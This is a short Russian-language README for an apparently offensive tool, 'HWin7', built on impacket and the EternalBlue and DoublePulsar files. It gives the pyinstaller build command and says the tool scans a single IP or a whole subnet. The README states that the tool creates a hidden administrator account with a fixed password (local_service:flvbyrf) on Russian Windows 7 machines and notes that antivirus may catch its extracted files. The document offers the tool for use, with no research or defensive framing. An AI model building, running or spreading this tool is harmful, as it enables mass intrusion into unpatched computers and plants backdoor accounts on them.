# HWin7v1.2
Зависимости:
	pip install pyinstaller			>> TO DO
	pip install impacket
	\mysmb.py
	\files	с файлами етблю, даблпульс...
	\dlls	с длл
	\logs	с любым файлом
	pyinstaller -F --add-data "F:/kali/1E/files;files/" --add-data "F:\kali\1E\dlls;dlls" --add-data "F:\kali\1E\logs;logs" "F:/kali/1E/HackWin7exe1.py"	>>> TO DO
папка logs не должна быть пустой
	Запуск через cmd окно. Принимает 1 ip или ip/24 /16 ...etc.
Создаёт администратора local_service:flvbyrf в русской win7 32/64 (если поправить, может XP)
Создаёт файл check_log.txt в папке C:\Windows\Temp 

Антивирус может ловить извлечённые файлы в C:\Users\юзер\AppData\Local\Temp
